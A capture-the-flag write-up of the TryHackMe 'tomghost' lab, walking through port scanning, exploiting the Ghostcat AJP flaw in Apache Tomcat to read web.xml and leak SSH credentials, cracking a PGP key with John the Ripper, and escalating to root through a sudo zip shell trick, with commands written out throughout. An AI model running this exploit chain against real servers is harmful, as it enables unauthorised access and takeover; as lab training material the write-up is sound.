## Target IP: `10.10.9.161`

---

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O 10.10.9.161 -oN results.txt
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 22 | SSH | OpenSSH 7.2p2 |
| 53 | ??? | tcpwrapped (unclear) |
| 8009 | AJP13 | Apache Jserv v1.3 |
| 8080 | HTTP | Apache Tomcat 9.0.30 |

---

### Web Enumeration (Port 8080)

Visited `http://10.10.9.161:8080`

→ Default Apache Tomcat splash page.

---

### Directory Brute Force (Using `ffuf`)

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -ic -s -r -o tomghost.txt -u http://10.10.9.161:8080/FUZZ
```

**FFUF Flag Breakdown:**

- `t 100` → 100 threads
- `ic` → Ignore case in response content
- `s` → Silent (suppress unnecessary output)
- `r` → Follow redirects
- `o` → Output to file
- `u` → Target URL

**Discovered Paths:**

- `/docs`
- `/examples`
- `/manager`
    
    (All led nowhere useful.)
    

---

### Exploiting Ghostcat (Port 8009 AJP)

**Ghostcat Vulnerability Summary (shortened):**

AJP on port 8009 allows unauthenticated access to sensitive files due to misconfigurations. If file uploads are allowed, remote code execution is possible.

Used Python tool from GitHub:

[ajpShooter.py](https://github.com/00theway/Ghostcat-CNVD-2020-10487)

**Command:**

```bash
python3 ajpShooter.py http://10.10.9.161:8080 8009 /WEB-INF/web.xml read
```

**Output included:**

```xml
...
<description>
   Welcome to GhostCat
      skyfuck:[REDACTED]
</description>
```

---

### SSH Login

```bash
ssh skyfuck@10.10.9.161
# Password: [REDACTED]
```

**Confirmed login success.**

```bash
sudo -l
# → skyfuck cannot run anything as sudo
```

---

### User Flag

- Found `merlin` user in `/home`
- `merlin/user.txt` → `THM{[REDACTED]}`

---

### Skyfuck’s Home Directory

**Files:**

- `credential.pgp` → Encrypted file
- `tryhackme.asc` → PGP private key (ASCII-armored)

**Downloaded both files using:**

```bash
scp skyfuck@10.10.9.161:/home/skyfuck/* .
```

---

### PGP Decryption Process (Fully Explained)

1. **What's Going On Here:**
    - `.pgp` = Encrypted file
    - `.asc` = Private key in text format
    - We need the password for the private key to decrypt the `.pgp` file
2. **Step-by-Step:**

**Step 1: Crack the password for the `.asc` key file**

```bash
gpg2john tryhackme.asc > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

**Result:**

`[REDACTED]` ← password for the PGP key

---

**Step 2: Import the key**

```bash
gpg --import tryhackme.asc
# Enter password: [REDACTED]
```

---

**Step 3: Decrypt the `.pgp` file**

```bash
gpg --output decrypted_file --decrypt credential.pgp
```

**Decrypted output:**

```
merlin:[REDACTED]
```

---

### SSH into `merlin`

```bash
ssh merlin@10.10.9.161
# Password: [REDACTED]
```

---

### Privilege Escalation (Sudo Zip Exploit)

```bash
sudo -l
# → (root : root) NOPASSWD: /usr/bin/zip
```

Used method from GTFOBins - zip:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

- `mktemp -u`: creates a unique temp filename
- `T -TT 'sh #'`: uses `sh` as the command when zip is executed

**Root shell achieved**

---

### Final Flag

```bash
cd /root
cat root.txt
# → THM{[REDACTED]}
```
    3. Use `gpg --decrypt` to open the `.pgp` file
